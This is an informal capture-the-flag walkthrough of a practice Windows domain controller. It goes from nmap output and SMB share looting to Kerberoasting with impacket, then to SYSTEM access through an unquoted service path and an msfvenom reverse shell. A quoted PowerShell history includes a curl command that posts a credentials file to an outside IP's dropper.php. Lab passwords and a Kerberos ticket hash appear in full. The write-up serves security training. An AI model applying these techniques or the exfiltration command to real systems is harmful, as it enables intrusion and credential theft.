Started with a nmap scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-11-19 19:57:51Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2025-11-19T19:58:54+00:00; +55s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-19T19:58:46+00:00
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-18T19:54:16
| Not valid after:  2026-05-20T19:54:16
| MD5:   86f8:b524:7b0d:eb49:5a2e:d28b:4290:2598
| SHA-1: 459d:9b75:fc3d:3484:39cc:4072:b178:5ab8:8c81:22eb
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7990/tcp  open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Log in to continue - Log in with Atlassian account
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
Domain `ENTERPRISE.THM` Hostname `LAB-DC` 
Checking out the webserver on port `7990` its a login for Atlassian but anything we do just redirects to the real site and the webhost on port `80` says its a `domain controller stay out` 
Checking out the DNS we cant find any subdomains for the sites 
Checking out the SMB guest account is enabled and gives us access to `users` and `Docs` shares there nothing in the users share we can access so moving to the docs share and there is two files `RSA-Secured_Credentials.xlsx` and `RSA-Secured-Documents-PII.xlsx` and both the files are password protected so we can try `office2john` to make it a hash and try cracking them I turned both files into hashes but we cant crack them so going back to checkout the other share agin we did have access to `LAB-ADMIN` share looking around there is a `AppData` which has a powershell history file and in there is come creds `replication:101RepAdmin123!!` 
```
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit
```
but before we start testing these creds im going to run a `rid-brute` to get all the users
```
Administrator
Guest
krbtgt
atlbitbucket
LAB-DC$
ENTERPRISE$
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner
```
so these creds we have should work for SMB but they dont and dont work for LDAP also this password does not work for anything so were at a dead end now going back to the webhost on port `7990` and there is a reminder on the page that says `all employees were moving to github` and if we google it there is a github repo and there is one user linked to the repo and there is a powershell script and if we look at the history there is more creds `nik:ToastyBoi!` and there is a user on the DC with the same username and these creds work so checking the user descriptions there is a password in it for one of the users `Password123!` but this leads us to another dead end one last thing we can try is getting the SPN since we do have real creds `impacket-GetUsersSPns lab.enterprise.thm/nik:'ToastyBoi!' -request` and get the ticket for the user `bitbucket` and we can try and crack this hash 
```
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$885d8ebfe972b0f02274061d0756653a$e7e2c766fa3c0322f50ffea4babbbe196ed33eb472afc14b7ff1e8029f7f5ef4505f62167ff780e26a77e0a287a503981873e0157b0fcc78f61e98d719a6f79f257abb85424d07b18b528c1334f2a4274d29a0d9f485c7384133e0612ac24849638deb56a8761e096a31f0cce0d24ef5e09d0e40c1f750a0be54f4518c65f56bd58af4852744ab697134c88f8a7113c46f37e26abe3c42d61f4df7c6ade9275edd49674dcc0ca7e03049a1f8d13ff615a1c2c75ce25dec4a845402204beaf4b817b0aa7aec6616a150b254392be72e85ce69916df0f99db416ffc646258f2cf9321116a23e805fe35b57465dbf1a2417d1b1c5716cecdda7465c020a8153e3ea5c7f72a161d999d163e31279d50c206ad4ba4abb032040765beb52f7536796bb0ce71f8e8c21b0b8276749c8d7c40d430b0fa4018c0ef4899b28c32be953cdce639e0049dd9a08034951c427d045d71493f9672d7d25d08297c87aae7053099a69fc211712ade99c2a2e5f2a96e1a5fafed153c1d28b8b32003ff58142ab7822e3a3aaaf9ae539a809b44a1baccd692bd603e3ee6c856024aee66c9960e63fcea5c0d91cbbb2b5640bcd7f6fb774b25cbcaff389ebaaa0ff20cd4e6a44861eef4b72b87a3f9c2db957072910b3ed08d2de47763a016b364cd9809130b15ddc455b6a3d1e4a7039b1c2c12c4c76dad0f79298b9e5be9ec9c1aa3696f17ac9eddbef532902c674ff7a1628ad261897ee5a8badcef61930b62038fa11e96a2bf7d5fc70b0f483d4e3255eba1bb193a853d83e898b0b81c14ad3af321fb3d0cab3fd5d852e9b26a77a9a94e466765880493248436cba05576edb4090200897f395cef6d6c7f655513ffa695f3b72d3e8d865aa9e2bdd741f262e774607261c1bea8fa4c60e766f0fb485bba00293553c784a76cd6d0151e5b04b4a914bbc7ec05392098a29b3946a3eabf4ad47fcdc5d66a369b0b4859a86ca063ceb02e4b7b0d42430ac4b26a5d8120f5eb83c68e1feb622b468cb02bb2a26cf1799ecfc421997eff47008f537b6e3c81dcd7c7a17b90e76cd6141404625c5fe7ee3bbb298d69f055cefbd271fcb3407a05ff98d4cc7d81ad9dbc715d915c59326e0e288c21714084c438011db6ae4956d21136e865eef8a49c8649bfa3d530b674744ec6ef0126572e0f0b2b483ac04624fb69946ead7796b138c9c6d3b7ef140bb25d7c1d609c2ad387383e1e820877fac9cad90b734db85507bb9e0ca368d5d96ac1574dbae68ae4c92fd70b7526ce8ce9ba4778d718016bea76201733acfb71e48d7c3ffd49d8db680333bc0c5aa8ebff82607d4334e83f91e621d8a2b8a0c37809736ec395f896734
```
and it cracked to `bitbucket:littleredbucket` and the only access to user has is there SMB share and we can get the user flag checking rdp access and it works so now we have access to the machine we can use `remmina` to access the desktop running winpeas we have unquoted path service path in the `C:\"Program Files(x86)/Zero Tier"/` and we can use msfvenom to make a exe reverse shell and upload it to the folder and then restart the service `sc start zerotierservice` and the binary has to be named `Zero.exe` and we get a call back as SYSTEM  